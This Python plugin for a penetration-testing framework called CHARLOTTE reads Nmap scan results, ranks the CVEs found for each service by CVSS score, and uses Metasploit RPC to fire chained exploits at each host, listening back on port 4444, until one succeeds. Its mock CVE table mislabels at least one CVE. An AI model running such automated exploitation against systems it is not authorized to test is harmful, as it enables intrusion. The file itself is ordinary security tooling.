# ******************************************************************************************
# cve_analysis_plugin.py
# Links Nmap scan data to CVEs, ranks risk, and invokes Metasploit exploit chaining
# ******************************************************************************************

import os
import sys
import json

# ============================================================================
# core/__init__.py
# Dynamically locate CHARLOTTE root and add to Python path
ROOT_DIR = os.path.abspath(os.path.join(os.path.dirname(__file__), "../../../"))
if ROOT_DIR not in sys.path:
    sys.path.insert(0, ROOT_DIR)

# Ensure CHARLOTTE core and plugins are importable
try:
    from utils import load_nmap_results  # CHARLOTTE's Nmap parser helper
    from core import cve_lookup               # Optional: your future CVE database interface
    from plugins.exploitation.metasploit import metasploit_plugin
except ImportError as e:
    print(f"[!] Import failed: {e}")
    print("[!] Ensure you are running this plugin from within the CHARLOTTE framework directory.")
    sys.exit(1)


# ==========================================================================================
# FUNCTION: mock_cve_lookup()
# Replace with real CVE database search or exploit-db/NVD API later
# ==========================================================================================
def mock_cve_lookup(service, version):
    """
    Return a list of mock CVEs for the given service/version pair.
    """
    mapping = {
        "apache": [("CVE-2021-41773", 9.8), ("CVE-2022-23943", 6.5)],
        "tomcat": [("CVE-2023-34362", 8.6)],
        "openssh": [("CVE-2020-14145", 5.4)]
    }
    return mapping.get(service.lower(), [])

# ==========================================================================================
# FUNCTION: rank_and_sort_cves()
# Sorts CVEs by severity (CVSS score)
# ==========================================================================================
def rank_and_sort_cves(cves):
    return sorted(cves, key=lambda x: x[1], reverse=True)

# ==========================================================================================
# FUNCTION: analyze_services_and_exploit()
# Parses Nmap scan results, finds CVEs, and launches best exploit
# ==========================================================================================
def analyze_services_and_exploit(client, nmap_path, lhost, lport):
    if not os.path.exists(nmap_path):
        print(f"[!] Nmap JSON results not found: {nmap_path}")
        return

    with open(nmap_path, "r", encoding="utf-8") as f:
        scan_data = json.load(f)

    for host_data in scan_data.get("hosts", []):
        rhost = host_data.get("ip")
        services = host_data.get("services", [])

        for svc in services:
            name = svc.get("name", "")
            version = svc.get("version", "")

            cve_list = cve_lookup(name, version)
            if not cve_list:
                print(f"[-] No CVEs found for {name} {version}")
                continue

            print(f"[+] {len(cve_list)} CVE(s) found for {name} {version}")
            sorted_cves = rank_and_sort_cves(cve_list)

            for cve_id, score in sorted_cves:
                print(f"[>] Attempting exploit for {cve_id} (CVSS {score}) on {rhost}")
                result = metasploit_plugin.execute_chained_cve(
                    client,
                    cve_id=cve_id,
                    rhost=rhost,
                    lhost=lhost,
                    lport=lport
                )

                if result and result.get("status") == "success":
                    print(f"[✓] Exploit succeeded for {cve_id} on {rhost}")
                    break  # stop after first successful exploit
                else:
                    print(f"[✗] Exploit failed or unavailable for {cve_id}")

# ==========================================================================================
# FUNCTION: main() — test run
# ==========================================================================================
if __name__ == "__main__":
    nmap_file = "output/nmap_scan_results.json"  # path to CHARLOTTE scan output
    client = metasploit_plugin.connect_to_msf(port=55553)
    
    if client:
        analyze_services_and_exploit(
            client,
            nmap_path=nmap_file,
            lhost="192.168.1.5",
            lport="4444"
        )
    else:
        print("[!] Failed to connect to Metasploit RPC server")
# ******************************************************************************************
# End of cve_analysis_plugin.py
# ******************************************************************************************
# This script is designed to be run as part of the CHARLOTTE vulnerability assessment framework.